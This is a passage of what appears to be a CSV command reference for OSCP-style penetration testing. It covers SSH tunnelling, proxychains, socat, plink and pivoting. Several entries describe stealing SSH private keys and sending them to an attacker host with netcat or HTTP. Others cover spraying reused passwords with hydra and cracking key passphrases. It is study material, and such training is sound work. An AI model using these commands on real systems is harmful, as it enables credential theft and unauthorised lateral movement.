TCP only, no UDP/ICMP support.","high","","","","{""Proxychains 'can't read configuration file'"": ""Check file exists: ls -la /etc/proxychains4.conf, verify readable"", ""Static binary incompatible with proxychains"": ""Proxychains uses LD_PRELOAD (dynamic linking only) - use tools with native SOCKS or recompile dynamically"", ""DNS leaks outside tunnel"": ""Enable proxy_dns in proxychains4.conf, or use -n flag with nmap to skip DNS"", ""Very slow scans through SOCKS"": ""Reduce tcp_read_time_out and tcp_connect_time_out to 1000ms in proxychains4.conf""}","{""-N"": ""Do not execute remote command - only creates SOCKS proxy tunnel"", ""-D"": ""Dynamic port forward - creates SOCKS proxy on specified port"", ""-v"": ""(Optional) Verbose mode for connection debugging"", ""-f"": ""(Optional) Background process after authentication""}","[""ssh-key-authentication""]","[""chisel-client"", ""ligolo-agent""]","[""proxychains-nmap"", ""proxychains-config""]"
"ssh-remote-port-forward","SSH Remote Port Forward (Reverse Tunnel)","pivoting","ssh -N -R <BIND_ADDRESS>:<REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote port forward - reverse tunnel binding port on SSH server, forwarding from compromised client","ssh_tunneling","ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4","Remote port forward reverses connection direction - critical for firewall bypass.

Listening port on attacker-controlled SSH server, forwarding done by SSH client on compromised host.

Use when inbound connections to compromised host blocked.

GatewayPorts security note:
Enabling in hostile networks allows anyone on SSH server's network to access forwarded port - bind to 127.0.0.1 when possible.","high","","","","{""Connection to SSH server times out"": ""Check outbound firewall on client, verify SSH server listening: sudo ss -ntplu | grep :22"", ""Permission denied (publickey)"": ""Password auth disabled - edit /etc/ssh/sshd_config, set PasswordAuthentication yes, restart sshd"", ""bind: Cannot assign requested address"": ""GatewayPorts not enabled for 0.0.0.0 - use 127.0.0.1 or enable GatewayPorts in sshd_config"", ""Port binds but connections hang"": ""Destination unreachable from client - verify routing from compromised host""}","{""-N"": ""Do not execute remote command - only creates reverse tunnel"", ""-R"": ""Remote port forward - syntax: [bind_address:]port:host:hostport"", ""-v"": ""(Optional) Verbose mode for troubleshooting connection issues"", ""-o ServerAliveInterval=60"": ""(Optional) Keep connection alive with 60-second heartbeat""}","[""ssh-key-authentication""]","[""chisel-client"", ""socat-port-forward""]","[""nc-reverse-shell"", ""curl-post""]"
"ssh-remote-dynamic-port-forward","SSH Remote Dynamic Port Forward (Reverse SOCKS)","pivoting","ssh -N -R <SOCKS_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote dynamic port forward - reverse SOCKS proxy on SSH server for firewall bypass with multi-destination flexibility","ssh_tunneling","ssh -N -R 9998 kali@192.168.118.4","Remote dynamic forward combines reverse tunnel (firewall bypass) with SOCKS proxy (multi-destination flexibility).

Requires OpenSSH 7.6 on compromised client (Windows 1803+ has version 8.1+, most modern Linux has 7.6).

Syntax difference:
Normal remote forward includes destination (-R port:host:hostport), remote dynamic only has port (-R port).

Critical OSCP technique for enumeration through firewalled pivot points.","high","","","","{""OpenSSH version too old"": ""Upgrade OpenSSH on client, or use alternative: ssh -R port:localhost:socks_port + standalone SOCKS server (microsocks)"", ""SOCKS port not listening on SSH server"": ""Verify OpenSSH server version \u22657.6: ssh -V on server, check sshd_config allows tunneling (PermitTunnel yes)"", ""Proxychains DLL init but no traffic"": ""Check proxychains4.conf syntax: [ProxyList] section correct, socks5 127.0.0.1 <SOCKS_PORT>"", ""Very slow performance"": ""Reduce timeouts in proxychains4.conf to 1000ms, use -T2 timing with nmap""}","{""-N"": ""Do not execute remote command - only creates reverse SOCKS tunnel"", ""-R <port>"": ""Remote dynamic forward - note no destination specified, creates SOCKS proxy"", ""-v"": ""(Optional) Verbose mode for connection debugging""}","[""ssh-key-authentication""]","[""ssh-dynamic-port-forward"", ""chisel-server""]","[""proxychains-nmap"", ""proxychains-config""]"
"socat-port-forward","Socat TCP Port Forward","pivoting","socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<DEST_IP>:<DEST_PORT>","Create simple TCP port forward using Socat - no encryption, no authentication, single command relay","port_forwarding","socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432","Socat simpler than SSH tunneling but lacks encryption and authentication.

Useful for quick port forwards when security less critical or SSH unavailable.

Limitation:
One listening port per Socat process - need separate process for each port forward.

Common OSCP use case:
Quick access to internal database when Socat already installed on compromised host.

For production:
Use SSH tunneling for encrypted, authenticated forwarding.","medium","","","","{""Socat not found"": ""Install Socat: sudo apt install socat, or download static binary: wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"", ""Address already in use"": ""Check listening ports: ss -ntplu, kill conflicting process: kill <PID>, or choose different port"", ""Connection refused to destination"": ""Verify destination reachable: nc -zv <DEST_IP> <DEST_PORT> from pivot host"", ""Socat dies after first connection"": ""Forgot 'fork' flag - add ',fork' to TCP-LISTEN: socat TCP-LISTEN:<PORT>,fork TCP:<DEST>:<PORT>""}","{""-ddd"": ""Debug verbosity level 3 - shows detailed connection information"", ""TCP-LISTEN:<port>,fork"": ""Listen on TCP port, fork creates subprocess for each connection (prevents single-connection death)"", ""TCP:<ip>:<port>"": ""Destination TCP socket to forward to"", ""-d or -dd"": ""(Alternative) Lower verbosity levels if less output desired""}","","",""
"plink-remote-forward","Plink Remote Port Forward","pivoting","plink.exe -ssh -l <SSH_USER> -pw <SSH_PASSWORD> -R <REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_HOST>","Create reverse SSH tunnel using Plink (PuTTY CLI) on Windows - bypass firewall by initiating connection from compromised host","ssh-tunneling","plink.exe -ssh -l kali -pw kali -R 9833:172.16.50.217:3389 192.168.45.x","Plink is PuTTY's command-line interface - ideal for Windows hosts without OpenSSH.

Unlike OpenSSH's ssh.exe, Plink supports password on command line with -pw (bad OPSEC but useful for scripts).

Critical OSCP technique:
Reverse tunnel allows pivot through firewall blocking inbound connections.

Alternative authentication:
Use -i <keyfile.ppk> for Putty private key (convert from OpenSSH with puttygen).

Production:
Use SSH keys, not passwords.

Time estimate:
3-5 minutes including file transfer.","high","","","","{""Plink not found"": ""Download Plink: powershell wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -O plink.exe, or use certutil: certutil -urlcache -f https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe plink.exe"", ""Store key in cache warning"": ""Answer 'y' to trust SSH server key fingerprint (first connection only)"", ""Remote port forwarding failed for listen port"": ""Port already in use on SSH server - choose different port or kill conflicting process: lsof -ti:PORT | xargs kill -9"", ""Plink window closes immediately"": ""Add cmd.exe pause or run interactively to see error messages""}","{""-ssh"": ""Force SSH protocol (not Telnet or rlogin)"", ""-l"": ""Login username for SSH authentication"", ""-pw"": ""Password for authentication (insecure - visible in process list, use -i for key file)"", ""-R"": ""Remote port forward - syntax: remote_port:dest_ip:dest_port"", ""-i"": ""(Alternative) Private key file for authentication instead of password"", ""-N"": ""(Optional) Do not execute remote command - only creates tunnel""}","","[""ssh-remote-forward"", ""chisel-client"", ""plink-remote-forward-windows""]","[""nmap-service-scan"", ""nc-listener-setup""]"
"xfreerdp-connect","xFreeRDP Connection","pivoting","xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard","Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass","remote-access","xfreerdp /v:192.168.50.63:3389 /u:rdp_admin /p:P@ssw0rd! /cert-ignore +clipboard","xFreeRDP is the standard Linux RDP client for OSCP.

Clipboard sharing critical for file transfer when no other options available.

Drive sharing with +drive:share,/path mounts local directory as \\tsclient\share in Windows - alternative to SMB/HTTP servers.

Common OSCP pattern:
RDP into dual-homed Windows host, then set up SSH/Plink tunnel to access internal network.

Time estimate:
1-2 minutes for connection.","high","","","","{""Connection timeout"": ""Verify RDP port open: sudo nmap -p <PORT> -Pn -v <TARGET>, check firewall rules"", ""CredSSP encryption oracle remediation"": ""Downgrade security: xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert-ignore /sec:rdp"", ""Certificate verify failed"": ""Always use /cert-ignore flag for self-signed certs in OSCP environments"", ""Clipboard not working"": ""Ensure +clipboard flag present, some Windows policies disable clipboard sharing""}","{""/v:"": ""Target server and port (syntax: ip:port)"", ""/u:"": ""Username for authentication"", ""/p:"": ""Password for authentication (visible in process list)"", ""/cert-ignore"": ""Ignore certificate verification errors (self-signed certs)"", ""+clipboard"": ""Enable clipboard sharing between local and remote"", ""/size:"": ""(Optional) Screen size - e.g., /size:1920x1080 or /size:1280x720"", ""/f"": ""(Optional) Fullscreen mode"", ""+drive:share,/path"": ""(Optional) Share local directory - accessible as \\\\tsclient\\share""}","[""nmap-service-scan""]","","[""mimikatz-sekurlsa-logonpasswords"", ""systeminfo-windows"", ""whoami-priv""]"
"ssh-version","SSH Version Check","pivoting","ssh -V","Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires 7.6)","ssh-tunneling","","Critical check before using ssh-remote-dynamic-port-forward.

OpenSSH 7.6+ required for reverse SOCKS proxy.

Windows 1803+ includes OpenSSH 8.1+.

Most modern Linux has 7.6+.","medium","","","","","{""-V"": ""Display version information and exit""}","","",""
"ssh-debug-verbose","SSH Verbose Debugging","pivoting","ssh -vvv <SSH_USER>@<SSH_HOST>","SSH connection with maximum verbosity - troubleshoot authentication, key exchange, and tunnel issues","ssh-tunneling","ssh -vvv database_admin@10.4.50.215","Use when SSH tunnels fail silently.

Verbose output shows:
key exchange, authentication attempts, tunnel establishment, connection forwarding.

Critical for diagnosing 'port forward works but connection hangs' scenarios.","medium","","","","","{""-v"": ""Verbose mode (level 1) - basic debugging"", ""-vv"": ""More verbose (level 2) - detailed connection info"", ""-vvv"": ""Maximum verbosity (level 3) - full protocol debug including key exchange""}","","",""
"sshuttle-vpn","SSHuttle VPN over SSH","pivoting","sshuttle -r <SSH_USER>@<SSH_HOST> <SUBNET>/<CIDR> --dns","Create transparent VPN over SSH - route entire subnets through pivot without proxychains","ssh-tunneling","sshuttle -r database_admin@10.4.50.215 172.16.50.0/24 --dns","SSHuttle creates transparent proxy - tools work normally without proxychains prefix.

Advantage over SOCKS:
UDP support, transparent to applications, easier syntax.

Disadvantage:
Requires Python on pivot, modifies local routing table (iptables), less stealthy than SOCKS.

OSCP use case:
When proxychains causes issues with specific tools (e.g., Metasploit, Responder).

Time estimate:
2-3 minutes for setup, ~30 seconds per subnet route.","medium","","","","{""server died with error code 127"": ""Python not found on pivot - install python3 or use alternative tunneling"", ""NAT traversal failed"": ""Requires iptables FORWARD rules - may need sudo on pivot or use ssh-dynamic-port-forward instead"", ""Routes disappear after disconnect"": ""SSHuttle removes routes on exit - keep terminal open or use screen/tmux"", ""Very slow performance"": ""Add --no-latency-control flag, or exclude pivot IP with -x to prevent routing loops""}","{""-r"": ""Remote SSH server (pivot point) - syntax: user@host[:port]"", ""--dns"": ""Forward DNS queries through tunnel (prevents DNS leaks)"", ""-x"": ""(Optional) Exclude subnet - e.g., -x 172.16.50.215/32 to exclude pivot itself"", ""-vv"": ""(Optional) Verbose output for debugging"", ""--no-latency-control"": ""(Optional) Disable latency optimization for speed""}","[""ssh-connect""]","[""ssh-dynamic-forward"", ""chisel-socks"", ""ligolo-server""]","[""nmap-service-scan"", ""bloodhound-ingest""]"
"ssh-connect-password","SSH Connect with Password","pivoting","ssh <USER>@<TARGET>","Connect to SSH server using password authentication for lateral movement or initial access","ssh","ssh admin@10.10.11.18","CRITICAL OSCP LATERAL MOVEMENT: Password reuse across services is common.

SSH password authentication workflow:
1. Enumerate SSH service: nmap -p 22 <TARGET>
2. Identify valid users: From /etc/passwd, web app, LDAP
3. Test credentials: From database dumps, config files, previous shells
4. Connect: ssh <USER>@<TARGET>
5. Upgrade shell: Usually not needed (SSH provides full PTY)
6. Enumerate: sudo -l, id, groups

Common OSCP scenarios:
(1) Database credentials work on SSH
     Dump MySQL user table, test passwords

(2) Web application credentials work on SSH
     Admin panel passwords often reused

(3) Credentials found in config files
     .env, config.php, database.yml

(4) Default credentials
     root:root, admin:admin, user:user

Manual verification before SSH:
# Verify SSH service running
nmap -p 22 -sV <TARGET>

# Check SSH banner for version
nc <TARGET> 22

# Verify user exists (if you have shell)
grep <USER> /etc/passwd

SSH flags for OSCP:
-p <PORT>  - Alternate SSH port
-v         - Verbose (debug connection issues)
-4         - Force IPv4 (avoid IPv6 issues)
-o StrictHostKeyChecking=no - Bypass host key verification (exam machines)
-o UserKnownHostsFile=/dev/null - Don't save host key

Password reuse attack vectors:
(1) Web app  SSH (most common)
(2) Database  SSH
(3) FTP  SSH
(4) SMB  SSH (Windows/Linux hybrid networks)
(5) User  Root (su with found password)

Alternatives:
sshpass -p 'password123' ssh user@target - Non-interactive password entry
hydra -l user -P passwords.txt ssh://target - Password spraying
medusa -h target -u user -P passwords.txt -M ssh - Alternative brute force

OSCP exam tip: ALWAYS test found credentials on SSH immediately. Document all credential pairs in credentials.txt. Common pattern: Web admin password = SSH user password.

Time estimate: 30 seconds (connection) + 0-5 minutes (troubleshooting)","high","","","","{""host_key_verification_failed"": ""Remove old key: ssh-keygen -R <TARGET>. Or bypass (INSECURE): ssh -o StrictHostKeyChecking=no <USER>@<TARGET>"", ""permission_denied"": ""Verify username exists: Check /etc/passwd from previous foothold. Try default users: root, admin, administrator. Check password is correct"", ""connection_refused"": ""SSH service not running or port filtered. Verify with nmap: nmap -p 22 <TARGET>. Try alternate port: ssh -p <PORT> <USER>@<TARGET>"", ""password_prompt_doesnt_appear"": ""Server may require key authentication only. Check /etc/ssh/sshd_config for PasswordAuthentication setting"", ""connection_hangs"": ""Network/firewall issue. Try verbose mode: ssh -v <USER>@<TARGET> to diagnose connection steps""}","","[""nmap-service-scan""]","[""ssh-key-authentication""]","[""pty-spawn-script"", ""linux-enumerate-users"", ""check-sudo-privs""]"
"ssh-key-authentication","SSH Connect with Private Key","pivoting","chmod 600 <KEY_FILE> && ssh -i <KEY_FILE> <USER>@<TARGET>","Connect to SSH server using private key authentication after extracting id_rsa from target system","ssh","chmod 600 id_rsa && ssh -i id_rsa admin@10.10.11.18","HIGH-VALUE OSCP TECHNIQUE: SSH key theft for lateral movement.

SSH key authentication workflow:
1. Find private key on compromised system
    Common locations: ~/.ssh/id_rsa, /home/*/.ssh/id_rsa, /root/.ssh/id_rsa

2. Extract key to attacker machine
    Method 1: cat id_rsa (copy/paste)
    Method 2: Base64 encode: base64 -w0 id_rsa (copy), base64 -d > id_rsa (paste)
    Method 3: HTTP server: python3 -m http.server 8000, wget from attacker

3. Fix key format if needed (see ssh-key-format)
    Check format: head -1 id_rsa
    If ""BEGIN OPENSSH PRIVATE KEY"": Good, use directly
    If ""BEGIN RSA PRIVATE KEY"": Good, use directly
    If encrypted: Crack with ssh2john

4. Set correct permissions (CRITICAL)
    chmod 600 id_rsa
    SSH will refuse to use key with wrong permissions

5. Connect with key
    ssh -i id_rsa <USER>@<TARGET>
    Username often matches key owner: ls -l /home/*/.ssh/id_rsa

6. Enumerate privileges
    sudo -l, id, groups

Common OSCP scenarios:
(1) Key found in web directory
     /var/www/.ssh/id_rsa (web user)

(2) Key found in user home
     /home/admin/.ssh/id_rsa (admin user)

(3) Key found in backup
     /opt/backups/id_rsa, /tmp/id_rsa.bak

(4) Key in Git repository
     .git/config, .git/ssh/, accidentally committed

(5) Multiple keys for different users
     Test each key against all known users

Key permissions explained:
600 (rw-------) - Owner read/write only (REQUIRED for private keys)
644 (rw-r--r--) - Too permissive, SSH will reject
700 (rwx------) - Directory permissions for .ssh/

Finding SSH keys on target:
# Find all private keys
find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null

# Find all .ssh directories
find / -type d -name '.ssh' 2>/dev/null

# Check current user's keys
ls -la ~/.ssh/

# Check all users' keys (if readable)
find /home -name 'id_*' 2>/dev/null

Testing key against multiple users:
for user in root admin user1 user2; do
  echo ""Testing $user""
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@target && echo ""SUCCESS: $user"" && break
done

Advanced flags:
-o BatchMode=yes - Don't prompt for passphrase (fail if encrypted)
-o StrictHostKeyChecking=no - Bypass host key verification
-o UserKnownHostsFile=/dev/null - Don't save host key
-v - Verbose (debug authentication issues)

OSCP exam tip: ALWAYS check ~/.ssh/id_rsa immediately after gaining shell. If found, extract immediately. Test against all known users. Document in breakthrough.md if successful.

Time estimate: 1-2 minutes (key extraction) + 30 seconds (connection)","high","","","","{""permissions_too_open"": ""Fix permissions: chmod 600 <KEY_FILE>. SSH requires private keys to be readable only by owner (not group or world)"", ""publickey_denied"": ""Key not in authorized_keys on target. Verify: cat ~/.ssh/authorized_keys on target should contain public key matching private key. May need to add manually"", ""invalid_format"": ""Key may need conversion. OpenSSH format required. Convert with: ssh-keygen -p -m PEM -f <KEY_FILE>. Or wrong key type - ensure private key not public key (.pub)"", ""passphrase_required"": ""Key is encrypted. Crack passphrase: ssh2john <KEY_FILE> > hash.txt && john hash.txt. Or use different key. Or try empty passphrase (press Enter)"", ""connection_refused"": ""SSH port closed or filtered. Verify with: nmap -p 22 <TARGET>""}","{""chmod 600"": ""Set restrictive permissions on private key - SSH requires key file to be readable only by owner (not group/other). Without this, SSH will refuse to use the key with 'WARNING: UNPROTECTED PRIVATE KEY FILE' error"", ""-i"": ""Specify identity file (private key) - tells SSH to use this key instead of default ~/.ssh/id_rsa for authentication""}","[""extract-ssh-key"", ""ssh-key-format""]","","[""linux-enumerate-users"", ""check-sudo-privs"", ""extract-ssh-key""]"
"extract-ssh-key","Extract SSH Private Key","pivoting","cat ~/.ssh/id_rsa","Extract SSH private key from compromised system for lateral movement via key authentication","ssh","","CRITICAL OSCP TECHNIQUE: SSH key theft enables passwordless lateral movement.

SSH private key locations (in order of likelihood):
(1) ~/.ssh/id_rsa - Current user's default RSA key
(2) ~/.ssh/id_ecdsa - Current user's ECDSA key (newer)
(3) ~/.ssh/id_ed25519 - Current user's Ed25519 key (newest)
(4) /home/<USER>/.ssh/id_rsa - Other users' keys (if readable)
(5) /root/.ssh/id_rsa - Root user's key (requires root access)
(6) /var/www/.ssh/id_rsa - Web user's key
(7) Backup locations: /tmp/id_rsa, /opt/backups/, .git/

Key extraction workflow:
1. Enumerate users: cat /etc/passwd | grep /bin/bash
2. Check current user's key: ls -la ~/.ssh/
3. Extract current user's key (THIS COMMAND)
4. Search for other users' keys:
   find /home -name 'id_rsa' -readable 2>/dev/null
5. Transfer key to attacker machine
6. Format key if needed (ssh-key-format)
7. Set permissions: chmod 600 id_rsa
8. Test key: ssh -i id_rsa <USER>@<TARGET>

Key format identification:
# RSA private key (older format, widely compatible)
-----BEGIN RSA PRIVATE KEY-----

# OpenSSH private key (newer format, OpenSSH 7.8+)
-----BEGIN OPENSSH PRIVATE KEY-----

# Encrypted private key (requires passphrase)
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...

Key transfer methods:
Method 1: Copy/paste (small keys)
- Cat key on target, copy output
- Paste into file on attacker: nano id_rsa
- Set permissions: chmod 600 id_rsa

Method 2: Base64 encoding (cleaner, no formatting issues)
- On target: base64 -w0 ~/.ssh/id_rsa
- Copy base64 string
- On attacker: echo '<BASE64>' | base64 -d > id_rsa
- Set permissions: chmod 600 id_rsa

Method 3: HTTP server (large keys, multiple files)
- On target: cd ~/.ssh && python3 -m http.server 8000
- On attacker: wget http://target:8000/id_rsa
- Set permissions: chmod 600 id_rsa

Method 4: Netcat transfer
- On attacker: nc -lvnp 9001 > id_rsa
- On target: nc ATTACKER_IP 9001 < ~/.ssh/id_rsa
- Set permissions: chmod 600 id_rsa

Common OSCP scenarios:
(1) Web user has SSH key for database server
     Pivot from web shell to database server

(2) User has SSH key for internal network
     Lateral movement to internal machines

(3) Backup script contains SSH keys
     /opt/backup.sh, /usr/local/bin/sync.sh

(4) Git repository with committed keys (mistake)
     git log --all --full-history -- '*.ssh/*'

(5) Keys in world-readable locations (misconfiguration)
     find / -name 'id_*' -perm -004 2>/dev/null

Public key verification:
Every private key has corresponding public key (.pub)
To verify key ownership:
1. Extract public key from private: ssh-keygen -y -f id_rsa
2. Compare with ~/.ssh/id_rsa.pub on target
3. Check authorized_keys: cat ~/.ssh/authorized_keys (shows where key grants access)

Testing extracted key:
# Test key against user it was found under
ssh -i id_rsa <USER>@<TARGET>

# Test key against all enumerated users
for user in $(cat users.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@<TARGET> 2>/dev/null && echo ""SUCCESS: $user""
done

# Test key against multiple targets (key reuse)
for ip in $(cat targets.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 <USER>@$ip 2>/dev/null && echo ""SUCCESS: $ip""
done

Advanced enumeration:
# Find all SSH-related files
find ~/.ssh -type f 2>/dev/null

# Check SSH config for key locations
cat ~/.ssh/config 2>/dev/null | grep IdentityFile

# Search bash history for SSH commands
cat ~/.bash_history | grep 'ssh\|scp\|id_rsa'

OSCP exam tip: Check for SSH keys IMMEDIATELY after shell upgrade. Priority locations: current user's ~/.ssh/, then /home/*/.ssh/. If found, extract and test against all known IPs/users. Document in breakthrough.md.

Time estimate: 1-2 minutes (search + extraction) + 30 seconds per transfer method","high","","","","{""file_not_found"": ""Key may not exist for current user. Search other locations: find /home -name 'id_*' 2>/dev/null. Check /root/.ssh/ if root access. Try alternate key types: id_dsa, id_ecdsa, id_ed25519"", ""permission_denied"": ""Can't read key (normal security). Try world-readable keys: find / -name 'id_rsa' -readable 2>/dev/null. Or escalate privileges first"", ""key_encrypted"": ""If 'Proc-Type: 4,ENCRYPTED' in header, key requires passphrase. Crack with: ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt"", ""extraction_method"": ""Copy/paste from terminal. Or base64 encode: base64 -w0 ~/.ssh/id_rsa (cleaner for transfer). Or setup HTTP server: python3 -m http.server 8000, wget from attacker""}","","[""linux-enumerate-home-directory"", ""pty-spawn-script""]","","[""ssh-key-format"", ""ssh-key-authentication""]"
"ssh-key-format","Convert SSH Key Format","pivoting","ssh-keygen -p -m PEM -f <KEY_FILE>","Convert SSH private key to PEM format for compatibility when key format causes authentication failures","ssh","ssh-keygen -p -m PEM -f id_rsa","SSH KEY FORMAT TROUBLESHOOTING: Modern OpenSSH keys may fail on older systems.

SSH key format evolution:
(1) PEM format (RFC 4716) - Older, widely compatible
    Header: -----BEGIN RSA PRIVATE KEY-----
    Used by: OpenSSH < 7.8, most tools
    Compatibility: Excellent

(2) OpenSSH format - Newer, better security
    Header: -----BEGIN OPENSSH PRIVATE KEY-----
    Used by: OpenSSH >= 7.8 (default since 2018)
    Compatibility: May fail on older systems

When format conversion needed:
(1) ""Load key: invalid format"" error during SSH
(2) Key extracted from newer OpenSSH system, using on older system
(3) Key needs to work with non-OpenSSH tools (PuTTY, WinSCP)
(4) Key format not recognized by ssh command

Format conversion workflow:
1. Extract key from target (extract-ssh-key)
2. Check format: head -1 id_rsa
3. If ""OPENSSH PRIVATE KEY"" and SSH fails:
    Convert to PEM (THIS COMMAND)
4. If ""RSA PRIVATE KEY"":
    Already PEM format, issue is elsewhere
5. Set correct permissions: chmod 600 id_rsa
6. Test: ssh -i id_rsa <USER>@<TARGET>

Command walkthrough:
ssh-keygen -p -m PEM -f id_rsa
1. Prompts: ""Enter old passphrase:"" - Press Enter (if no passphrase) or enter passphrase
2. Prompts: ""Enter new passphrase:"" - Press Enter (keep no passphrase) or set new one
3. Prompts: ""Enter same passphrase again:"" - Press Enter or confirm
4. Output: ""Your identification has been saved with the new passphrase""
5. Result: Key now in PEM format

Alternative methods:
Method 1: ssh-keygen with empty passphrase
ssh-keygen -p -N '' -m pem -f id_rsa
 No prompts, sets empty passphrase automatically

Method 2: OpenSSL conversion
openssl rsa -in id_rsa -out id_rsa.pem
 Uses OpenSSL instead of ssh-keygen
 May handle corrupted keys better

Method 3: PuTTYgen (Windows)
puttygen id_rsa -O private-openssh -o id_rsa.pem
 For converting to PuTTY format (PPK) or vice versa

Verifying key format after conversion:
# Check header
head -1 id_rsa
# Should show: -----BEGIN RSA PRIVATE KEY-----

# Verify key is valid
ssh-keygen -y -f id_rsa
# Should output public key without errors

# Test authentication
ssh -v -i id_rsa <USER>@<TARGET>
# Verbose mode shows authentication details

Common OSCP scenarios:
(1) Key extracted from Ubuntu 20.04+ (OpenSSH 8.x)
     Kali uses older OpenSSH version
     Conversion needed

(2) Key from Windows OpenSSH
     May be in different format
     Convert to PEM for Linux compatibility

(3) Key works on target, fails on Kali
     Format mismatch between SSH versions
     Convert to universal PEM format

Remove passphrase from encrypted key:
# If you have the passphrase
ssh-keygen -p -N '' -f id_rsa
 Enter old passphrase when prompted
 Press Enter for new passphrase (empty)
 Key now usable without passphrase

# If you don't have passphrase
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Crack passphrase with John the Ripper
 Then remove passphrase with above command

OSCP exam tip: If extracted SSH key fails with ""invalid format"", immediately try format conversion. Pre-practice: ssh-keygen -p -m PEM -f id_rsa. Keep this command in your notes. Usually not needed but critical when it is.

Time estimate: 30 seconds (conversion) + 0-5 minutes (troubleshooting)","medium","","","","{""invalid_format"": ""Key file corrupted. Verify header: head -1 <KEY_FILE> should show -----BEGIN. Re-extract from target"", ""permissions_error"": ""Fix permissions first: chmod 600 <KEY_FILE>, then retry conversion"", ""passphrase_prompt"": ""If key is encrypted, you need original passphrase to convert. If unknown, crack with: ssh2john <KEY_FILE> > hash.txt && john hash.txt"", ""still_not_working"": ""Try removing passphrase entirely: ssh-keygen -p -N '' -f <KEY_FILE>. Or test with verbose SSH: ssh -v -i <KEY_FILE> <USER>@<TARGET> to see detailed error""}","{""-p"": ""Change passphrase - in this case, we're using it to trigger format conversion without changing the passphrase (press Enter when prompted to keep existing passphrase or no passphrase)"", ""-m PEM"": ""Specify output format as PEM (RFC 4716) - older, more compatible format. Converts from newer OpenSSH format if needed. Essential for compatibility with older SSH implementations"", ""-f"": ""Specify key file to operate on - the private key file that needs format conversion""}","[""extract-ssh-key""]","","[""ssh-key-authentication""]"
"proxychains-config","Configure Proxychains","pivoting","echo 'socks5 <BIND_ADDRESS> <SOCKS_PORT>' >> /etc/proxychains4.conf","Configure proxychains4.conf to route traffic through SOCKS proxy - required before using proxychains","proxychains","echo 'socks5 127.0.0.1 9999' >> /etc/proxychains4.conf","Critical configuration step for SSH dynamic forwarding.

Default config uses Tor (socks4 127.0.0.1 9050) - must replace with your SOCKS proxy.

Recommended settings for OSCP:
tcp_read_time_out = 1000, tcp_connect_time_out = 1000, proxy_dns enabled.

Chain types:
strict_chain (all proxies must work), dynamic_chain (skip dead proxies), random_chain (randomize order).

For exam:
Use strict_chain with single SOCKS proxy.

Alternative:
Create ~/.proxychains/proxychains.conf for user-specific config without sudo.","high","","","","{""Permission denied editing /etc/proxychains4.conf"": ""Use sudo: sudo bash -c 'echo \""socks5 <IP> <PORT>\"" >> /etc/proxychains4.conf', or create user config: mkdir ~/.proxychains && cp /etc/proxychains4.conf ~/.proxychains/"", ""proxychains shows old configuration"": ""Clear existing [ProxyList] entries: sudo sed -i '/^socks/d' /etc/proxychains4.conf before adding new one"", ""Configuration syntax error"": ""Ensure format: socks5 <IP> <PORT> (space-separated, no quotes), verify [ProxyList] section exists"", ""DNS leaks outside tunnel"": ""Uncomment proxy_dns in config: sudo sed -i 's/#proxy_dns/proxy_dns/' /etc/proxychains4.conf""}","","[""ssh-dynamic-forward"", ""chisel-socks""]","[""proxychains-config-verify""]","[""proxychains-nmap""]"
"proxychains-nmap","Nmap Through Proxychains","pivoting","proxychains -q nmap -sT -Pn --top-ports=<TOP_PORTS> -v <TARGET>","Port scan through SOCKS proxy using proxychains - enumerate internal networks via pivot","proxychains","proxychains -q nmap -sT -Pn --top-ports=20 -v 172.16.50.217","Critical OSCP technique for internal network enumeration through pivot.

Limitations:
TCP-only (no UDP/ICMP), must use -sT (connect scan, not SYN scan), no OS detection (-O), slower than direct scanning.

Performance tuning:
Reduce proxychains timeouts to 1000ms, use --top-ports=20 instead of -p-, add -T2 or -T3 timing.

For full subnet scans, consider parallel execution:
for ip in {1..254}; do proxychains -q nmap -sT -Pn --top-ports=20 172.16.50.$ip & done.

Time estimate:
1-2 minutes per host with top 20 ports.","high","","","","{""Socket error or timeout"": ""Verify SOCKS proxy: ss -ntplu | grep <SOCKS_PORT>, test with proxychains curl http://<TARGET>"", ""Very slow scan (5+ minutes)"": ""Reduce timeouts in /etc/proxychains4.conf: tcp_read_time_out=1000, tcp_connect_time_out=1000, use -T2 timing: proxychains nmap -sT -T2 -Pn"", ""Static binary incompatible"": ""Proxychains uses LD_PRELOAD (dynamic linking) - recompile nmap dynamically or use sshuttle instead"", ""DNS resolution hangs"": ""Add -n flag to skip DNS: proxychains nmap -sT -Pn -n <TARGET>, or enable proxy_dns in proxychains4.conf""}","{""-q"": ""Proxychains quiet mode - suppress proxy chain output"", ""-sT"": ""TCP connect scan (required - proxychains uses LD_PRELOAD, incompatible with SYN scan)"", ""-Pn"": ""Skip ping - assume host up (ICMP doesn't work through SOCKS)"", ""--top-ports"": ""Scan N most common ports (faster than full 65535 scan)"", ""-v"": ""Verbose output to show progress"", ""-n"": ""(Recommended) Skip DNS resolution to prevent leaks and speed up scan"", ""-p"": ""(Alternative) Scan specific ports - e.g., -p 22,80,443,3389,445""}","[""ssh-dynamic-port-forward"", ""chisel-server""]","[""proxychains-nmap""]","[""nmap-service-scan"", ""enum4linux-smb"", ""crackmapexec-smb-framework""]"
